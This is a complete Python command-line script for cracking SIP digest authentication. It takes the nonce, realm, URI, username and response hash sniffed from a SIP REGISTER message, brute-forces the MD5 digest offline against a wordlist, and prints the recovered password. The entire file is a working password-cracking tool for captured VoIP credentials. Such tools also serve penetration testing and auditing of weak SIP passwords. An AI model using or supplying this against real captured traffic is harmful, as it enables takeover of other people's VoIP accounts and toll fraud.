#!/usr/bin/env python3

import sys
import argparse
from hashlib import md5

parser = argparse.ArgumentParser(
    description="SIP Digest Auth Crack"
)

parser.add_argument(
    '--username',
    dest="USERNAME",
    type=str,
    help="The username you'll find in \"Authorization\"-Header of second Register Message"
)

parser.add_argument(
    '--uri',
    dest="URI",
    type=str,
    help="The SIP URI you'll find in \"Authorization\"-Header of second Register Message"
)

parser.add_argument(
    '--nonce',
    dest="NONCE",
    type=str,
    help="The nonce you'll find in \"Authorization\"-Header of second Register Message"
)

parser.add_argument(
    '--realm',
    dest="REALM",
    type=str,
    help="The realm you'll find in \"Authorization\"-Header of second Register Message"
)

parser.add_argument(
    '--wordlist',
    dest="WORDLIST",
    type=str,
    help="The word list which will be used for brute force"
)

parser.add_argument(
    '--msg',
    dest="MESSAGE",
    type=str,
    default="REGISTER",
    help="The message which was used for authentication. Default is \"REGISTER\""
)

parser.add_argument(
    '--response',
    dest="RESPONSE",
    type=str,
    help="The response aka hash value"
)

parser.add_argument(
    '--cnonce',
    dest="CNONCE",
    type=str,
    help="CONCE value (UAC nonce)"
)

parser.add_argument(
    '--noncecount',
    dest="NONCECOUNT",
    type=str,
    help="The count of using the given nonce by client"
)

parser.add_argument(
    '--qop',
    dest="QOP",
    type=str,
    help="QOP method"
)

args = parser.parse_args()




if args.CNONCE:
    NONCE = (args.NONCE + ":" + args.NONCECOUNT + ":" + args.CNONCE + ":" + args.QOP)

else:
    NONCE = args.NONCE


lines = [line.rstrip('\n') for line in open(args.WORDLIST)]

i = 0

while i < len(lines):
    try:
        output=int(round((int(i)/int(len(lines)))*int(100)))  
        if (output == 0) or (output == 20) or (output == 40) or (output == 60) or (output == 80):
            print("\033[1;34m[*]\033[0m Progress: " + str(output) + "%", end="\r")
			
        str1 = md5("{}:{}:{}".format(args.USERNAME,args.REALM,lines[i]).encode('utf-8')).hexdigest()
        str2 = md5("{}:{}".format(args.MESSAGE,args.URI).encode('utf-8')).hexdigest()
        str3 = md5("{}:{}:{}".format(str1,NONCE,str2).encode('utf-8')).hexdigest()
        
        if str3 == args.RESPONSE:
            print("\033[1;32m[+]\033[0m Success! The password is: " + lines[i])
            sys.exit(0)
        
        else:
            i += 1

    except (KeyboardInterrupt):
        print("\033[1;34m[*]\033[0m User interruption. Exiting ...")
        sys.exit(0)



print("\033[1;34m[*]\033[0m No password cracked")
sys.exit(0)

